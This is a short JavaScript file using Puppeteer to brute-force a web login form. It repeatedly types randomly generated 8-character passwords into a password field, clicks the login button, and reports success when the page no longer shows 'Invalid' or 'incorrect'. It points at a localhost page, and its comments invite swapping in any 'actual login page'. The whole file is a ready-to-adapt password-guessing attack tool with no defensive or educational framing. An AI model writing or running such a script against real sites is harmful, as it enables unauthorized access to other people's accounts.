const puppeteer = require("puppeteer");

// Function to generate a random 8-character password
function generatePassword() {
  const chars =
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+";
  let password = "";
  for (let i = 0; i < 8; i++) {
    password += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return password;
}

(async () => {
  const browser = await puppeteer.launch({ headless: false });
  const page = await browser.newPage();

  await page.goto("http://127.0.0.1:5500/index.html"); // Replace with your actual login page

  let attempt = 0;

  while (true) {
    const password = generatePassword();
    attempt++;
    console.log(`Attempt #${attempt}: Trying password -> ${password}`);

    await page.waitForSelector("#password"); // Change as per your actual password input selector
    await page.evaluate(() => {
      document.querySelector("#password").value = "";
    });
    await page.type("#password", password);

    await page.click("#loginBtn"); // Change as per your actual login button
    await new Promise((resolve) => setTimeout(resolve, 2000));

    // Update this logic as per actual website response
    const loginSuccess = await page.evaluate(() => {
      return (
        !document.body.innerText.includes("Invalid") &&
        !document.body.innerText.includes("incorrect")
      );
    });

    if (loginSuccess) {
      console.log(`SUCCESS! Password found: ${password}`);
      break;
    }
  }

  await browser.close();
})();
